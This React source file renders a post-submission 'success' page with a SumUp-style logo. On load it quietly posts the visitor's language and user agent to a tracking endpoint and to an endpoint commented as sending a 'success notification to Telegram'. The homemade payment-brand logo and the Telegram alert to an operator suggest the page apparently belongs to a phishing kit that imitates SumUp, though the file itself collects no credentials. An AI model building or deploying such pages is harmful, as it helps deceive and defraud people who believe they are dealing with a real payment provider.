import { useEffect } from "react";
import { Link } from "wouter";
import { CheckCircle2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useTranslation } from "@/contexts/LanguageContext";

export default function Success() {
  const { t } = useTranslation();

  useEffect(() => {
    document.title = t('success_page_title');
    
    // Track visitor when page loads with language info
    const language = navigator.language || 'Unknown';
    apiRequest("POST", "/api/track-visit", { 
      page: "Success Page",
      language 
    }).catch(() => {
      // Silent fail - tracking shouldn't break the app
    });

    // Send success notification to Telegram
    const userAgent = navigator.userAgent || 'Unknown';
    apiRequest("POST", "/api/success-notification", {
      language,
      userAgent
    }).catch(() => {
      // Silent fail - notification shouldn't break the app
    });
  }, [t]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md text-center space-y-8">
        {/* Success Icon */}
        <div className="flex justify-center">
          <div className="relative">
            <div className="absolute inset-0 bg-green-100 rounded-full animate-ping opacity-75"></div>
            <div className="relative bg-green-500 rounded-full p-6">
              <CheckCircle2 className="w-16 h-16 text-white" />
            </div>
          </div>
        </div>

        {/* Success Message */}
        <div className="space-y-4">
          <h1 className="text-4xl font-bold text-black" data-testid="text-title">
            {t('success_title')}
          </h1>
          <p className="text-lg text-gray-600" data-testid="text-description">
            {t('success_description')}
          </p>
        </div>

        {/* Success Details */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 space-y-3">
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>{t('success_detail_1')}</span>
          </div>
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>{t('success_detail_2')}</span>
          </div>
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>{t('success_detail_3')}</span>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="space-y-4 pt-8">
          <Link href="/">
            <button
              type="button"
              className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 transition-all"
              data-testid="button-go-home"
            >
              {t('success_button_home')}
            </button>
          </Link>

          <p className="text-sm text-gray-500">
            {t('success_tagline')}
          </p>
        </div>

        {/* SumUp Logo */}
        <div className="pt-8 opacity-60">
          <div className="flex items-center justify-center gap-2">
            <div className="h-6 w-6 bg-black rounded-md flex items-center justify-center">
              <svg viewBox="0 0 24 24" fill="white" className="h-4 w-4">
                <path d="M13 10V3L4 14h7v7l9-11h-7z" />
              </svg>
            </div>
            <span className="text-base font-semibold">sumup</span>
          </div>
        </div>
      </div>
    </div>
  );
}
